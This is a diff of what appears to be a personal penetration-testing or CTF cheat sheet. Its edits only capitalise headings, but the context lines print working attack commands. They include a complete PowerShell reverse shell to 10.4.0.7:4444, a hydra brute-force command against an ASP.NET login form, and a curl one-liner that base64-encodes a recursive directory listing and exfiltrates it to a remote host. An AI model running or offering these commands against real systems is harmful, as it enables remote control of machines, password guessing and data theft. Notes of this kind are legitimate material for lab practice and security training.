@@ -104,7 +104,7 @@ powershell reverse shell!
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.4.0.7',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-## shell tricks
+## Shell tricks
 
 making a bad reverse shell better:
 
@@ -223,7 +223,7 @@ The below targets an aspx page, that needed viewstate to go with it in order to 
 
 `hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.aspx:__VIEWSTATE=pIru3H%2F3LYg1qp3lNSwHX1ALuENNV6tddZ32Zp4xRIs57ec4jlYH9sp8EHtZ0sp66EsCaToBXZLEbw62lNBT7XuKpv84ZHetBU3stATD5DYczl9JagBTENtoK%2B6lyNFyDsrRWb34%2F9jXclG%2FsQWa1tJXjQAYZJP2MJNhNaH2WMIL%2FQf9&__EVENTVALIDATION=lQWGlUQ0Fmhz%2BuiWoqOKaexWGfGTltskH%2FV3RsXfmd%2B8N5m8JCLGWXUm7pFZQj0G0QjJMd3MLudMx0zUAlot%2BanlZVtlggDnm3e%2B2DNiDwnhrETOWRZdwtNypSULvwzs8ZlD1SiHFFPASQz1PJN12l5Fi3uL4UCohXb%2BBjCo1nU5Sz7I&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"`
 
-## downloading files with windows (or linux missing curl/wget)
+## Downloading files with windows (or linux missing curl/wget)
 
 without the use of powershell or anything clever. great for pulling files off my attacker machine
 
@@ -277,7 +277,7 @@ this will exfiltrate command outputs if all you have is the ability to make web 
 
 `ls -laR ../../../ | base64 -w0 | xargs -I T curl 10.10.149.217:1234/?x=T`
 
-## padding oracle attacks
+## Padding oracle attacks
 
 use https://github.com/AonCyberLabs/PadBuster
 might need to install: `sudo apt-get install libcrypt-ssleay-perl`
